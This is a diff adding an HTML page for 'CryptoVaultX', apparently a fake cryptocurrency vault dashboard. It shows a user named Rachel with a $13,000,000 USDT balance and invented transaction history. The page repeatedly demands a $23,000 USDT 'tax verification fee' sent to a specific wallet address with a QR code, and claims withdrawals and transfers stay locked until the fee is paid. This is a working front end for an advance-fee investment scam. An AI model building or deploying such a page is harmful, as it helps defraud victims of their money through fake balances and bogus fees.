@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CryptoVaultX - Secure Holdings</title>
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+  <div class="container">
+    <div class="navbar">
+      <h1>CryptoVaultX</h1>
+      <div class="user-info">
+        <img src="https://via.placeholder.com/40" alt="Rachel" class="avatar">
+        <span>Rachel</span>
+        <button class="logout-btn" onclick="logout()">Log Out</button>
+      </div>
+    </div>
+    
+    <div class="sidebar">
+      <ul>
+        <li><a href="#" onclick="showSection('dashboard')"><i class="fas fa-home"></i> Home</a></li>
+        <li><a href="#" onclick="showSection('recharge')"><i class="fas fa-plus"></i> Recharge</a></li>
+        <li><a href="#" onclick="showSection('withdraw')"><i class="fas fa-minus"></i> Withdraw</a></li>
+        <li><a href="#" onclick="showSection('transfer')"><i class="fas fa-exchange-alt"></i> Transfer</a></li>
+        <li><a href="#" onclick="showSection('transactions')"><i class="fas fa-history"></i> Transactions</a></li>
+        <li><a href="#" onclick="showSection('settings')"><i class="fas fa-cog"></i> Settings</a></li>
+      </ul>
+    </div>
+
+    <div class="content">
+      <div id="login" class="login-box">
+        <h2>Secure Access</h2>
+        <input type="text" id="username" placeholder="Account Holder">
+        <input type="password" id="password" placeholder="Access Key">
+        <button onclick="checkLogin()">Enter Vault</button>
+        <div id="error" class="error"></div>
+      </div>
+
+      <div id="dashboard" class="section">
+        <div class="dashboard-grid">
+          <div class="card">
+            <h3>Live Balance</h3>
+            <p class="balance">$13,000,000 <span class="currency">(USDT)</span></p>
+            <p class="ticker">Next Update: <span id="timer">5s</span></p>
+          </div>
+          <div class="card">
+            <h3>Vault ID</h3>
+            <p>XV-7841-3920-5763</p>
+          </div>
+          <div class="card">
+            <h3>Last Sync</h3>
+            <p id="timestamp"></p>
+          </div>
+        </div>
+        <div class="security">Secured by Multi-Sig Encryption & Blockchain Ledger</div>
+        <div class="notice">
+          <strong>Compliance Alert:</strong> To unlock full access, deposit a $23,000 (USDT) tax verification fee to: <strong>TTiCirwEoYgPjGRHABRKvemeGxdDHbY2z4</strong>. Access granted upon blockchain confirmation.
+          <div class="qr-code">
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=TTiCirwEoYgPjGRHABRKvemeGxdDHbY2z4" alt="USDT QR">
+          </div>
+        </div>
+        <div id="warning" class="warning">Transfers Restricted Until Compliance Verified</div>
+      </div>
+
+      <div id="recharge" class="section" style="display: none;">
+        <h2>Recharge Wallet</h2>
+        <p>Deposit USDT to activate funds. Use address: <strong>TTiCirwEoYgPjGRHABRKvemeGxdDHbY2z4</strong></p>
+        <button class="action-btn" onclick="showNotice('Deposit initiated—awaiting blockchain confirmation.')">Confirm Deposit</button>
+      </div>
+
+      <div id="withdraw" class="section" style="display: none;">
+        <h2>Withdraw Funds</h2>
+        <p class="warning">Withdrawals locked until compliance is met.</p>
+        <button class="action-btn" disabled onclick="showNotice('Withdrawal restricted—complete tax verification.')">Request Withdrawal</button>
+      </div>
+
+      <div id="transfer" class="section" style="display: none;">
+        <h2>Transfer Funds</h2>
+        <p class="warning">Transfers locked until compliance is met.</p>
+        <button class="action-btn" disabled onclick="showNotice('Transfer restricted—complete tax verification.')">Initiate Transfer</button>
+      </div>
+
+      <div id="transactions" class="section" style="display: none;">
+        <h2>Transaction History</h2>
+        <ul class="transaction-list">
+          <li>2025-03-01: Received $5,000 USDT (Pending)</li>
+          <li>2025-02-28: Tax Fee Notice Issued ($23,000 USDT Required)</li>
+          <li>2025-02-25: Initial Deposit $13,000,000 USDT (Confirmed)</li>
+        </ul>
+      </div>
+
+      <div id="settings" class="section" style="display: none;">
+        <h2>Account Settings</h2>
+        <p>Security Level: High | 2FA Enabled</p>
+        <button class="action-btn" onclick="showNotice('2FA settings updated successfully.')">Update Security</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
